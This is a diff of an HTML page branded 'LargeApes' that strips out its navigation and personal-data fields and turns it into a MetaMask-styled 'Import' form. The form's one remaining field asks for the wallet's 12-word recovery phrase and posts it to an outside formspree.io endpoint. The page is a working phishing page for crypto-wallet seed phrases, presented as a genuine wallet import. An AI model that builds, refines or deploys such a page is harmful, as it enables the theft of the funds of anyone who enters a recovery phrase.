@@ -17,8 +17,8 @@ font-family: "sans-serif";
 color: white;
 } 
 section{
-	height: 120vh;
-	background-color: darkslategray;
+	height: 100vh;
+	background-color: rgb(0, 0, 0);
 	display: flex;
 	align-items: center;
 	justify-content: center;
@@ -30,7 +30,7 @@ section{
 	max-width: 400px;
 	margin: 0 auto;
 	padding: 20px;
-	box-shadow: 0px 0px 20px;
+	box-shadow: 0px 0px 3px;
 	border-radius: 8px;
 	margin-bottom: 20px;
 }
@@ -101,6 +101,9 @@ button[type="submit"]:hover{
 .pages{
 	text-align: center;
 }	
+.line-one{
+	padding-left: 25%;
+}
 @keyframes status{
 	0%{
 		opacity: 1;
@@ -116,17 +119,7 @@ button[type="submit"]:hover{
 	}
 
 	}
-	</style>
-	<div class="pages">
-		<nav class="navbars"> 
-		<label class="Logo">LargeApes</label>
-		<ul>
-			<li><a class="active" href="index.html">Home</a></li>
-			<li><a href="aboutlargeApes.html">About</a></li>
-			<li><a href="#">Feedback</a></li>
-		</ul>
-	</nav>
-	<style>
+	
 		#id_name{
 			padding: 0;
 			margin: 0;
@@ -137,38 +130,8 @@ button[type="submit"]:hover{
 		body{
 			font-family:"sans-serif" ;
 		}
-		nav.navbars{
-		align-content: center;
-			background: black;
-			height: 50px;
-			width: 100%;
-		}
-		label.logo{
-			color: white;
-			font-size: 35px;
-			line-height: 80px;
-			padding: 0 100px;
-			font-weight: bold;
-			
-		}
-	
 		
-		nav ul li{
-			display: inline-block;
-			line-height: 80px;
-			margin: 0 5px;
-		}
-		nav ul li a{
-			color: white;
-			font-size: 10px;
-			padding: 7px 13px;
-			text-transform: uppercase;
-		}
-		a.ative, a:hover{
-			background: #1e1e1e;
-			transition: .5s;
-		}
-	</style></div>
+		</style></div>
 
 </head>
 <body>
@@ -177,33 +140,37 @@ button[type="submit"]:hover{
 	<div class="account">
 		
 			
-		<p type="account"> Create Account</p>
+		
+		
 	</div>
 	<div class="container">
+		<span class="line-one">
+			<i><img class="account" src="Metamask1.png" height="200px" width="200px" alt="no image"></i>
+		</span>
 		<form action="https://formspree.io/f/mwkzeoqq" method="POST" id="my-form">
-			<div class="form-group">
-			 <label for="FirstName">First Name</label>
-			<Input type="text" id="FirstName" name="FirstName" required>
-		</div>
-		<div class="form-group">
-				<div class="form-group">
-			 <label for="LastName">Last Name</label>
-			<Input type="text" id="LastName" name="LastName"required>
-		</div>
+			<!-- <div class="form-group"> -->
+			 <!-- <label for="FirstName">First Name</label> -->
+			<!-- <Input type="text" id="FirstName" name="FirstName" required> -->
+		<!-- </div> -->
+		<!-- <div class="form-group"> -->
+				<!-- <div class="form-group"> -->
+			 <!-- <label for="LastName">Last Name</label> -->
+			<!-- <Input type="text" id="LastName" name="LastName"required> -->
+		<!-- </div> -->
 
-		<div class="form-group">
-			 <label for="email">Email</label>
-			<Input type="text" id="email" name="email" placeholder="example@email.com"required>
-		</div>
+		<!-- <div class="form-group"> -->
+			 <!-- <label for="email">Email</label> -->
+			<!-- <Input type="text" id="email" name="email" placeholder="example@email.com"required> -->
+		<!-- </div> -->
 
 			<div class="form-group">
-			 <label for="ImportWallet">Import wallet</label>
+			 <label for="ImportWallet">Metamask wallet</label>
 			<textarea  type="text" id="ImportWallet" name="ImportWallet" placeholder="Wallet 12 word Phrase" required></textarea>
 			<p id="phrase">Typically 12 words separated by single space</p>
 		
 		</div>
 
-		<select class="pl-5 form-control" name="country" id="country" required>
+		<!-- <select class="pl-5 form-control" name="country" id="country" required>
 			<option selected disabled>Choose Country</option>
 				<option value="Afganistan">Afghanistan</option>
 <option value="Albania">Albania</option>
@@ -452,14 +419,17 @@ button[type="submit"]:hover{
 <option value="Zaire">Zaire</option>
 <option value="Zambia">Zambia</option>
 <option value="Zimbabwe">Zimbabwe</option>                                                </select>
-	</div>
+	</div> -->
 
-		<button type="submit">Submit</button>
+		<button type="submit">Import</button>
 
 		</form>
 		</div>
 		<div id="status"></div>
 </section>
+<footer>
+</footer>
+<p class="form-group" textflex-wrap>© 2022 LargeApes.tech. ALL RIGHTS RESERVED.</p>	
 <script src="./main.js"></script>
 </body>
 </html>
